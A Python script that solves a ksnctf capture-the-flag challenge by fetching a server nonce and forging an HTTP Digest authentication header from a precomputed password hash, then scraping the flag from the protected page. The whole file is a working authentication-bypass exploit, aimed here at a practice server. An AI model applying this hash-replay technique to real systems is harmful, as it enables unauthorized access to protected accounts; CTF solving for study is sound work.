#!/usr/bin/env python

import md5
import re
import requests

def genResponse(snonce):
    md5_a1 = "c627e19450db746b739f41b64097d449"
    nc = "00000001"
    cnonce = "9691c249745d94fc"
    qop = "auth"
    md5_a2 = md5.new("GET:/~q9/flag.html").hexdigest()
    plain = "%s:%s:%s:%s:%s:%s" % (md5_a1, snonce, nc, cnonce, qop, md5_a2)
    response = md5.new(plain).hexdigest()
    print("[*] Response: %s" % response)

    return response

def getNonce(target):
    pattern = r'nonce="[^"]+"'
    snonce = ""
    print("[*] Fetching nonce...")

    try:
        res = requests.get(target)
    except:
        print("[-] Connection Error.")
        exit(0)

    try:
        snonce = re.search(pattern, res.headers['WWW-Authenticate']).group(0).lstrip("nonce=").strip("\"")
    except:
        print("[-] Response Error.")
        exit(0)

    print("[+] Nonce: %s" % snonce)

    return snonce


def main():
    url = "http://ksnctf.sweetduet.info:10080/~q9/flag.html"
    nonce = getNonce(url)
    response = genResponse(nonce)
    auth = "Digest username=\"q9\", realm=\"secret\", nonce=\"%s\",uri=\"/~q9/flag.html\", algorithm=MD5, response=\"%s\", qop=auth, nc=00000001, cnonce=\"9691c249745d94fc\"" % (nonce, response)
    print("[*] Authorization Header: %s" % auth)
    head = {
        'Authorization': auth,
        'Accept-Encoding': 'gzip,deflate,sdch',
        'Accept-Language': 'ja,en-US;q=0.8,en;q=0.6',
        'Accept-Charset': 'Shift_JIS,utf-8;q=0.7,*;q=0.3',
        'Connection': 'keep-alive'
    }

    print("[*] Fetching flag...")

    try:
        res = requests.get(url, headers=head)
        flag = re.search(r'<p>[^<]+', res.text).group(0).lstrip('<p>')
        print("[+] FLAG: %s" % flag)
    except:
        print("[-] Failed.")

if(__name__ == '__main__'):
    main()
